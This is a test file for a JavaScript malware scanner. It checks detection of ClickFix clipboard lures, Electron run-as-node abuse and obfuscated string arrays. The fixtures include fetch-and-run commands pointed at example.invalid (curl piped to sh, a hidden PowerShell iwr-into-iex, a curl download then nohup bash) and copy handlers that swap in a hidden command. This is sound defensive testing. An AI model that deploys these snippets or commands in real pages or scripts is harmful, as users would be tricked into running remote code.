import test from 'node:test';
import assert from 'node:assert/strict';
import { inspect } from '../packages/unk-scanner/src/inspect.mjs';
import { obfuscatedFixture } from './fixtures/obfuscate.mjs';

const kinds = source => inspect(source).findings.map(f => `${f.kind}:${f.severity}`);

test('copy button writing element text is a note only', () => {
  assert.deepEqual(kinds('btn.onclick = () => navigator.clipboard.writeText(block.innerText);'), ['clipboard-write:note']);
});

test('copy attribution derived from the selection is not an override', () => {
  const source = `document.addEventListener('copy', e => {
    e.clipboardData.setData('text/plain', window.getSelection().toString() + ' (source)'); e.preventDefault(); });`;
  assert.deepEqual(kinds(source), ['clipboard-write:note']);
});

test('install command on a copy button is a warning, not an error', () => {
  assert.ok(kinds("navigator.clipboard.writeText('curl -fsSL https://example.invalid/i.sh | sh');")
    .includes('clickfix-clipboard-command:warning'));
});

test('ClickFix: copy handler substitutes a hidden PowerShell command held in a constant', () => {
  const source = `const c = 'powershell -w hidden -nop -c "iwr https://example.invalid/a | iex" # verification 1234';
document.addEventListener('copy', function (event) { event.preventDefault(); event.clipboardData.setData('text/plain', c); });`;
  const result = inspect(source).findings;
  const clickfix = result.find(f => f.kind === 'clickfix-clipboard-command');
  assert.equal(clickfix.severity, 'error');
  assert.ok(clickfix.indicators.includes('copy-event-override'));
  assert.ok(clickfix.indicators.includes('powershell-hidden'));
  assert.equal(result.find(f => f.kind === 'clipboard-copy-override').severity, 'note');
});

test('ClickFix: named copy handler registered separately is recognised', () => {
  const source = `function h(e){ e.clipboardData.setData('text', payload()); e.preventDefault(); }
window.addEventListener('copy', h);`;
  assert.ok(kinds(source).includes('clipboard-copy-override:note'));
});

test('Electron: reading is context, launching is a warning, hidden launching is an error', () => {
  assert.deepEqual(kinds('if (process.env.ELECTRON_RUN_AS_NODE) load();'), ['campaign-marker:note']);
  // The language-client pattern used by legitimate extensions.
  const client = `const opts = { env: { ...process.env, ELECTRON_RUN_AS_NODE: '1' } };
child_process.spawn(process.execPath, [serverModule], opts);`;
  const warning = inspect(client).findings.find(f => f.kind === 'electron-run-as-node');
  assert.equal(warning.severity, 'warning');
  assert.match(warning.detail, /process\.execPath/);
  const hidden = `const ps = ["$env:ELECTRON_RUN_AS_NODE = '1'", "& node agent.js"].join("\\n");
const args = '-NoProfile -WindowStyle Hidden -File x.ps1';`;
  const error = inspect(hidden).findings.find(f => f.kind === 'electron-run-as-node');
  assert.equal(error.severity, 'error');
  assert.match(error.detail, /hides execution/);
  // A bundled elevation helper elsewhere in the file does not escalate.
  const bundle = `function elevate(p){ return ['Start-Process', p, '-WindowStyle hidden', '-Verb runAs'].join(' '); }
function agent(sh, cmd){ sh.exec(\`ELECTRON_RUN_AS_NODE=1 /bin/sh -c "\${cmd}" &\`); }`;
  assert.equal(inspect(bundle).findings.find(f => f.kind === 'electron-run-as-node').severity, 'warning');
});

test('Electron: assignment of the variable and hidden script paths are warnings', () => {
  assert.ok(kinds("env['ELECTRON_RUN_AS_NODE'] = '1';").includes('electron-run-as-node:note'));
  assert.ok(kinds("spawn('node', ['/tmp/.cache/x.js'], { detached: true });").includes('child-process-hidden-script:warning'));
  assert.deepEqual(kinds("spawn('git', ['status']);"), []);
});

test('string array: RC4 variant recovered by checksum and fed to other rules', () => {
  const strings = ['1203xQz', '88kLm', '451pq', '7aa', 'https://example.invalid/config.json', 'child_process',
    'OVERLORD_SERVER_RAW', 'hello', 'world', 'filler-one', 'filler-two', 'filler-three'];
  const fixture = obfuscatedFixture({ strings, rotation: 5 });
  const source = fixture.source +
    `const u = ${fixture.call('https://example.invalid/config.json')};\n` +
    `const cp = require(${fixture.call('child_process')});\n` +
    `const m = ${fixture.call('OVERLORD_SERVER_RAW')};\n`;
  const result = inspect(source);
  assert.equal(result.deobfuscation[0].method, 'checksum');
  assert.equal(result.deobfuscation[0].rotation, 5);
  assert.equal(result.deobfuscation[0].variant, 'rc4');
  const details = result.findings.map(f => `${f.kind}|${f.detail}`);
  assert.ok(details.some(d => d.startsWith('obfuscated-string-indicator|https://example.invalid/config.json')));
  assert.ok(details.some(d => d === "obfuscated-string-indicator|require('child_process') (resolved from string array)"));
  assert.ok(result.findings.some(f => f.kind === 'campaign-marker' && f.via === 'string-array'));
  assert.ok(details.some(d => d.startsWith('string-array-obfuscation|string array _0xarr resolved')));
});

test('string array without a checksum: RC4 resolves by consensus, keyless base64 stays unresolved', () => {
  const strings = Array.from({ length: 30 }, (_, i) => `entry number ${i}`);
  const rc4 = obfuscatedFixture({ strings, rotation: 11, checksum: false });
  const rc4Result = inspect(rc4.source + strings.map(s => `use(${rc4.call(s)});`).join('\n'));
  assert.equal(rc4Result.deobfuscation[0].method, 'printable-consensus');
  assert.equal(rc4Result.deobfuscation[0].rotation, 11);
  assert.equal(rc4Result.deobfuscation[0].decodedSites, 30);
  // Every rotation of a keyless base64 array decodes to printable text, so the
  // rotation is ambiguous and must not be guessed.
  const plain = obfuscatedFixture({ strings, rotation: 11, variant: 'base64', checksum: false });
  const plainResult = inspect(plain.source + strings.map(s => `use(${plain.call(s)});`).join('\n'));
  assert.equal(plainResult.deobfuscation[0].method, 'unresolved');
  assert.equal(plainResult.deobfuscation[0].decodedSites, 0);
  // Without any rotation code the stored order is the decoded order.
  const flat = obfuscatedFixture({ strings, rotation: 0, variant: 'base64', checksum: false });
  const flatResult = inspect(flat.source + `use(${flat.call('entry number 4')});`);
  assert.equal(flatResult.deobfuscation[0].method, 'unrotated');
  assert.ok(flatResult.findings.some(f => f.kind === 'string-array-obfuscation' && /1\/1 call sites decoded/.test(f.detail)));
});

test('evaluator refuses impure or unsupported expressions', () => {
  // The ClickFix rule still harvests text stored into s; the value is not resolved.
  const result = inspect("let s = 'curl x | sh'; s = 'echo'; navigator.clipboard.writeText(s);");
  assert.equal(result.findings.find(f => f.kind === 'clipboard-write').detail, 'dynamic argument; unresolved');
  assert.equal(inspect("navigator.clipboard.writeText(fetchText());").findings[0].detail, 'dynamic argument; unresolved');
});

test('custom rules use the plugin interface', () => {
  const rule = {
    id: 'demo-eval',
    meta: { severity: 'warning', description: 'demo' },
    create(context) {
      return { CallExpression(node) { if (node.callee.name === 'eval') context.report({ node, detail: 'eval call' }); } };
    },
  };
  const result = inspect('eval(x);', { rules: [rule] });
  assert.deepEqual(result.findings.map(f => [f.kind, f.severity, f.detail]), [['demo-eval', 'warning', 'eval call']]);
  assert.throws(() => inspect('1', { rules: [{ id: 'Bad Id', create() {}, meta: { severity: 'note' } }] }), /Invalid rule/);
});

test('ClickFix: a generic copy helper is traced to the command its callers pass', () => {
  const source = `async function copyText(text) { await navigator.clipboard.writeText(text); }
function build(origin) { return \`curl -ks \${origin}/x -o /tmp/x&&nohup bash /tmp/x >/dev/null 2>&1 &\`; }
button.onclick = () => copyText(build(location.origin));`;
  const finding = inspect(source).findings.find(f => f.kind === 'clickfix-clipboard-command');
  assert.equal(finding.severity, 'error');
  assert.match(finding.detail, /text passed by callers/);
});

test('string array: a parameterless minified rotation loop is solved, never assumed unrotated', () => {
  const strings = ['1203xQz', '88kLm', '451pq', '7aa', 'alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta'];
  const fixture = obfuscatedFixture({ strings, rotation: 4, minified: true });
  const result = inspect(fixture.source + `use(${fixture.call('gamma')});`);
  assert.equal(result.deobfuscation[0].method, 'checksum');
  assert.equal(result.deobfuscation[0].rotation, 4);
  // If the loop exists but cannot be solved, the array must stay unresolved.
  const broken = fixture.source.replace(/if\(([^=]+)==/, 'if(0.5==') + `use(${fixture.call('gamma')});`;
  assert.notEqual(inspect(broken).deobfuscation[0].method, 'unrotated');
});

test('TypeScript and JSX fall back to Babel AST-only parsing with the same rules', () => {
  const ts = inspect(`const cmd = 'powershell -w hidden -nop -c "iwr https://example.invalid/a | iex"' as string;
document.addEventListener('copy', (e: ClipboardEvent) => { e.clipboardData!.setData('text/plain', cmd); });`, { filename: 'lure.ts' });
  assert.equal(ts.parser, 'babel:typescript');
  assert.equal(ts.findings.find(f => f.kind === 'clickfix-clipboard-command').severity, 'error');
  const jsx = inspect('const b = <button onClick={() => navigator.clipboard.writeText("x")}>Copy</button>;', { filename: 'b.jsx' });
  assert.equal(jsx.parser, 'babel:jsx');
  assert.equal(jsx.findings[0].kind, 'clipboard-write');
  // Without a file name the dialect is tried in turn.
  assert.match(inspect('let n: number = 1;').parser, /^babel:/);
  assert.equal(inspect('const x = 1;').parser, 'acorn');
  assert.throws(() => inspect('const = ;', { filename: 'bad.ts' }), SyntaxError);
});
